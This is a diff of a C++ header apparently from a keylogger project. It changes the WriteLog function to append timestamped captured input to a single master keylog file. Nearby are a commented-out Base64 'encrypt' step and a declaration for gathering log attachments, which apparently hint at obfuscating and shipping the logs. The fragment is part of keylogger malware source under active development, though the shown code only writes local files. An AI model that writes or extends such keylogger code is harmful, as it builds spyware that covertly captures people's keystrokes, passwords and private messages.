@@ -32,40 +32,42 @@ namespace IO
 	std::vector<std::string> GetAttatchments(const std::string& path);
 
 	/**
-	 * Writes to new keylog file
-	 * Returns empty string if file failed to open	
+	 * Appends to master keylog file
+	 * Returns false if file fails to open	
 	 * 
 	 * Defined in header because template functions
 	 * have to be defined where they are declared
 	 **/
 	template <class T>
-	std::string WriteLog(const T& t)
+	bool WriteLog(const T& t)
 	{
 		std::string path = GetOutputPath(true);
 		Utils::DateTime dt;
-		std::string name = dt.GetDateTimeString("_") + ".log";
 
 		try
 		{
-			std::ofstream out(path + name);
+			std::ofstream out(path + MASTER_LOG_NAME);
 			if (!out)
-				return "";
+				return false;
+
 			std::ostringstream s;
 			s << "[" << dt.GetDateTimeString() << "]" << std::endl
 				<< t << std::endl;
 
 			// Encrypt here
 			// std::string data = Base64::EncryptB64(s.str());
+
 			out << s.str();
 
 			if (!out)
-				return "";
+				return false;
+
 			out.close();
-			return name;
+			return true;
 		}
 		catch (...)
 		{
-			return "";
+			return false;
 		}
 	}
 }
